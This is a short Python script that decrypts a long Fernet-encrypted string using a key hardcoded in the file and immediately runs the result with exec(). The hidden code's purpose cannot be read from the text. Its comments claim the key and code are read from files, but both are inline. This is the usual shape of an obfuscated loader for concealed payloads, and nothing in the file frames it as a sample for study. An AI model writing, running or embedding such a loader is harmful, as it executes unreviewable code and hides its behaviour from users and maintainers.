from cryptography.fernet import Fernet


# Read the key from the file
key = "xne-spcbVB91Tx3a7wrPJSaHfYxIQaHgcpk5M50Kzrs="
# Instantiate a Fernet cipher suite using the read key
cipher_suite = Fernet(key)

# Read the encrypted code from the file
encrypted_code = "gAAAAABmIp24q94FGWdtCefldKDOK-T0LWPxM7gokyuMaLXHWopl5i23ER_yt1smVR3whImm0w01JGYxfPJR8MnzZnAIXQLkodENsYaS5Ja2GLLh92Qm8sk9SKwonIbIeVXsK5JgKUV1fwbc-jz690xArkwpppzqAYTO98nXl2AmMoKURkK9__J6IteDDkfA-oLS-oMuSLcZtCsdCg0Kbg4JcaUgRn3LnpLVVgObxTYZBIHqR6CjgMxHleLd6O-QJRTyeVVg86NeRqMBE_HilbxMyjay9Q7zCQzqi-rvh3o5kULTGjLEHtBoqYTS_P9QVcfc3IfwbWlPPlBddRdn3S6Y1vQkm6RuXsgH6kAaNB4EMbNk84RIRiJj2bS3gKIsJvRuOwrdJ5LApEYVSkNORsRiFXILWVuGywKOcZGpDM5dLXVgwO55aFsW62DsJ_hb1yrRv1NoHCWLgSXRQUMkq4krxf749F_1PFl_HRLMBCRR9Boyznfy1LmxsIqyN0wepQsGtInKdVRImOWqZLrfX37xPPaZ-4YmpLLuryaG0JSCrJe4EekcKW5td8Ieo2inss2LhMDJVl2CwIcTvdEK2KcyMadNDz_eJxdUzsgU7BmRXFGWT_er1rKlAUZBNO84OzJ_U68SZAG5Bk8T12Y6ojU4FyFTsxXv63bQ_ePv0lVea34T7qIxoK_LnFHJJZtuxgHXw7OyjQtU9oC5Kfm4DSCS-W-UoYNO-tBwBxmaCdUEHs60KCv-b1eV7DPY0SLmPGiVrDzKe4v1RNZ2zeHgnvnAGzJZNMbOYTYM6vlPLMjEEdf-9p4Pn670wWOQD4cSB8hShUqsLBBoaI53VKiPS8uhXLHmDu0UfUMWpU-tZw649-RhY3Glx3PsSo1maljm1VCEAb1WjO3KtUz13jehIfwHb8TFgWOjFt3MbJ9IqpISCf4I3WtpWIl5BVbPFW0ZIYf7otU4VPpJHvGbqsi83iZhUMOTjlP838O3ZIT7ENktRhuq9UoWxgqU7cGBG5JAe-Uy1NGXZj412qJ4aU82GBVi07po22VhhRLWQSMhrkBka6LJSna7fOs9jeqOa8JlCKflRC2Rz422FKHWVBceixZq4Xh27fklGaJ7d95m64NiijOxcudQm_HcdiPFuIM35JGHVorJ_vhOzGAJ4f8f7gyK47NCO1664Pe6wLOtCLZJLDexrrPEwVIvEl8Wl1WJ61GidFM2Ej38h8iN9jh6JRcjTqhYwL0MQDns5t5J3xxeKa2Zckdn89_UdMYqmB-czvHWZYDpNybLhf8xnvypqMWYb3oeAJRC-eeTR3sclm9SyUlA1vRbAPnTYVAE7uiEqHssjGCtKOdSj-ACnXiq2IcKlXKbLvLqVGsQm3Sw5_E21cx1pMC54tpma6k7firHpP3mZGqjSDuszldCLSXHiIax3Lqmg54XIJR76wtls_w7_aCBtQNkjeJJDhpv5gJtjjBkIAWZbl38PwnqN48sccuMG6BKPXklCYMDMIw5pRPAjAgErvVTF7AaR2TgdpxB7UDD48raNJFiC_2S_OG_1wvRFqZRlxDpJHjos-6bB-gJXNUn9eJ-e0vFhHne42M1FVMaiGPLfYeXm2UiK2Kf2Jb1Nn1cRUeEpwnRFmoUQ_5UL_33_iWckTOGNRp4_bBcWsLG0AlzM7lsMWp3DREyTMiF_v_92reGIQHhQ3cC4HgdC8DCyDVK9D6r842r1qgTgXsxuY3Lo7nyLakQvFTgY2wTIPBWmZq77aCwDiKShhkNLBDIKm_Jw_Q2SdqfuoE7WziCEfjBQ3X90GKPSmjIzM140xEPYBJV6GX-uHK4okRlB5IsT6Z5Xi4uZwqFt-msZdBjJnaa5BKJZfmtJHxniM9qKEWepLP2bwv5CaHZ5IP-kwdBuz0W55NdBrRXqc3zIVyRI1KcLJZUY5bbZn_4BDFeI6T_ilK7l49Vrv576sE99p1Gi0GZfWGtP5YSHin_sEcv7x-MzLkMIwNW2Nd1xg4MVOt4_WGLOkO4-xIkBgMExCq_gqEZyxdb5Ex70eBJ-lj38m_2dwP221KHc3oOf5DX_IsdO2C946tTJKXlot8G2ux6G2hsMSFu7pahXkZe5y9l7EnIHulSShDCfE757D4GO_sZzkB2ynjAxThNy1sSr4voGVENLMg_t3HvEDN99Ss97B66QJVW1XiGOc5tG6PTPgVcruFtt8O4-xnvMmPb3WIXTJdPGJneyDGeysqWDK_HRl7IVxUFWqCUVrPROC-WTbZmB11JBrwla2-95WUTvj3Z5eFB3_npQGNHRdZ_4tNbcHZLEtJzY6_GXQpq971HibyeTuzyr172Upd3d4R7F2kDqyZU4uNxxK4RBGGf1t7f380U7hNllbzrMunHSdEJ5KQbZgbXBsrzbCSuiOrdDxczejIWxX9iwHDUjjlJSGPqQ9tSdXa7HYZIbemlgCdI01j8hISunfadxNpxkupWuwMo5XUQzl96rqIs5CbRfk0xXaOHPJpNS7BMcIqIisjuVmBk7McfRv7vBN4jJTB0Qxvi9A-iM8RlNrLaR9au-rEcSwqhopgiqZYbc8b5P2GLG6wiVEOPHe57G-Vi3sPIFWHQ4Ads18q6s4EyO1Vq22omGDQ6IPrTtS0R8wPzBxiZX_FMU0TJQktesxcBgUyT2co5d893WB2luvIsM2AjtizYqLFuZViALE3fKrrrGXxCr0s3OrUoighBuiMBuoVzW_IdMPNm_I26EBK99x7xmnQu4V5kxjNeo4A4IiYDqj05EL0BADj8Oycu1eytVyb-tNSWCulzccbAL9vHUTgB70Is-5PhSfJ6WxelQfxhib_kaUBlNnZYSUGPmi39lLKvQWyhtLin_-yVAJ0kZq2rAdu1rSkGTam7-jt3rPcNh5o2kjlYBKA5VnG8L6rKHYSnTSgi8ZADvnZl1lgHmvMPQKN8Hq4kKVX6KiIQu29vBqri-LFU6WKEccAIoD8UF3qFzhzZRI3TZZgBYNuGey-edAnvvwCBsf6y5es6ac5xAVZYsQf06dRSMKNYyBp8N68CmR0ChV77kjWFdZlCVka1vHrRC4jkvJckMtX1GbmPt5nmOjEy_F4mwQR5Bgbz0EOR-QDK-jJa7HYTykXKdvbZNwLZDECUZHPsAFM_4XUJn5t9fCJI3q2NBEKrQGWib8TRMDTgC-a5iKWKharXcuzw9R_9BSLlJlO5cH_UFDD1u74GNsUckc2u1inPgaucw81RcOoYk2yfmHmG66c5Ol-K1Nz07WigNWwCFaFi6R_t32nc8hvCXpQmbTpMSLI5L0Sa3A6sphkahCmEs_WAv3QieR1wV6LNeHmRPwg0vGSnNeiX0vV1zxtfLrAsH0bdPHQOKO1KJFO9WEr6mVLRb0rdAJIN-uAzdengz_nSdDOgNL4A1L4zsuKDxFn1fKyxBrapU8H0xDFvmxZaRlx3dHkmfbwrAeqtTrAIrSBJDnQf9HGEZkWkIpjZU7v6uLJiLSSt04l3Of81vrwhtjhOysg7MmCwUTJpH9K_TBZLViJ0gSWEUTYMxnmNTgX1pZRqQ2_w0nSsOCGmaSJfHWSqR2xpVpUqjfhnW8DtYvb97YRjbMDC9G0I4GZigvpreuKYrYCvrjDWl9qRynPFAC6B-AUnUmdevbFIaiwHQfxT6Wg_XzMt99bOjIhDpg93qj-HYjTY7wcAR52j0b4mHyAq6jylCMefF9Be5E805D-YbMpY1F2cnH-BtpBEC8tLSzhT8-_EUeHWjkm2lv9iXL1kOVh-UPeDOG_nJiEH"
# Decrypt the code
decrypted_code = cipher_suite.decrypt(encrypted_code)


# Execute the decrypted code
exec(decrypted_code.decode())